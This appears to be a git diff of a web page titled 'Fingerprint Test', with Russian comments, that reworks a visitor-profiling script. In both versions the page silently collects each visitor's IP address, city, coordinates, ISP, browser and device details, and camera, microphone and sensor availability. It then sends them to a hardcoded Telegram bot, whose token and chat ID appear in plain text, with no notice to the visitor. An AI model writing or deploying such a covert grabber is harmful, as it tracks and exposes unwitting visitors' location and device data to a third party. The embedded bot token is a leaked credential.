@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Fingerprint Test</title>
-  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs-pro@3.0.0/dist/fingerprintjs-pro.min.js"></script>
 </head>
 <body>
 
@@ -49,42 +48,51 @@ function getClientInfo() {
       // Тип устройства (мобильное или десктопное)
       const deviceType = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua) ? 'Mobile' : 'Desktop';
 
-      // Использование FingerprintJS для более точной идентификации устройства
-      FingerprintJS.load().then(fp => {
-        fp.get().then(result => {
-          const deviceFingerprint = result.visitorId; // Уникальный отпечаток устройства
-          const brand = result.components.os.name || 'Unknown Brand';
-          const model = result.components.device.model || 'Unknown Model';
-          
-          // Формируем сообщение для отправки
-          const message = encodeURIComponent(
-            `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
-            `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
-            `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}\n` +
-            `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
-            `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}\n` +
-            `Brand: ${brand}\nModel: ${model}\nFingerprint: ${deviceFingerprint}\n` +
-            `WebRTC Support: ${isWebRTCSupported}\nCamera Available: ${hasCamera}\nMicrophone Available: ${hasMicrophone}\n` +
-            `Gyroscope Support: ${hasGyroscope}\nAccelerometer Support: ${hasAccelerometer}\nGeolocation API Support: ${hasGeolocation}\n` +
-            `Connection Type: ${connectionType}\nCanvas Support: ${isCanvasSupported}\nService Worker Support: ${isServiceWorkerSupported}`
-          );
+      // Проверка поддержки WebRTC
+      const isWebRTCSupported = typeof navigator.mediaDevices.getUserMedia === 'function' ? 'Yes' : 'No';
 
-          // Настроим Telegram Bot API URL для отправки сообщения
-          const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';  // Ваш токен
-          const chatId = '669186959';  // Ваш чат ID
-          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
+      // Проверка доступности камеры и микрофона
+      const hasCamera = 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices ? 'Yes' : 'No';
+      const hasMicrophone = 'mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices ? 'Yes' : 'No';
 
-          // Отправляем данные в Telegram
-          fetch(telegramUrl)
-            .then(response => response.json())  // Преобразуем ответ от Telegram в JSON
-            .then(data => {
-              console.log('Message sent successfully:', data);
-            })
-            .catch(error => {
-              console.error('Error sending message:', error);
-            });
+      // Проверка доступности сенсоров (акселерометр, гироскоп)
+      const hasGyroscope = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+      const hasAccelerometer = 'DeviceMotionEvent' in window ? 'Yes' : 'No';
+
+      // Поддержка Geolocation API
+      const hasGeolocation = 'geolocation' in navigator ? 'Yes' : 'No';
+
+      // Дополнительные параметры
+      const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown Connection Type'; // Тип подключения
+      const isCanvasSupported = typeof HTMLCanvasElement !== 'undefined' ? 'Yes' : 'No'; // Проверка поддержки Canvas
+      const isServiceWorkerSupported = 'serviceWorker' in navigator ? 'Yes' : 'No'; // Проверка поддержки Service Workers
+
+      // Формируем сообщение, которое отправим в Telegram
+      const message = encodeURIComponent(
+        `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
+        `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
+        `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}\n` +
+        `Vendor: ${vendor}\nApp Version: ${appVersion}\nWebGL Support: ${isWebGLSupported}\nCookies Enabled: ${cookiesEnabled}\n` +
+        `Device Memory: ${deviceMemory} GB\nLoad Time: ${loadTime}\nDevice Type: ${deviceType}\n` +
+        `WebRTC Support: ${isWebRTCSupported}\nCamera Available: ${hasCamera}\nMicrophone Available: ${hasMicrophone}\n` +
+        `Gyroscope Support: ${hasGyroscope}\nAccelerometer Support: ${hasAccelerometer}\nGeolocation API Support: ${hasGeolocation}\n` +
+        `Connection Type: ${connectionType}\nCanvas Support: ${isCanvasSupported}\nService Worker Support: ${isServiceWorkerSupported}`
+      );
+
+      // Настроим Telegram Bot API URL для отправки сообщения
+      const botToken = '1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4';  // Ваш токен
+      const chatId = '669186959';  // Ваш чат ID
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`;
+
+      // Отправляем данные в Telegram
+      fetch(telegramUrl)
+        .then(response => response.json())  // Преобразуем ответ от Telegram в JSON
+        .then(data => {
+          console.log('Message sent successfully:', data);
+        })
+        .catch(error => {
+          console.error('Error sending message:', error);
         });
-      });
     })
     .catch(error => {
       console.error('Error fetching IP details:', error);
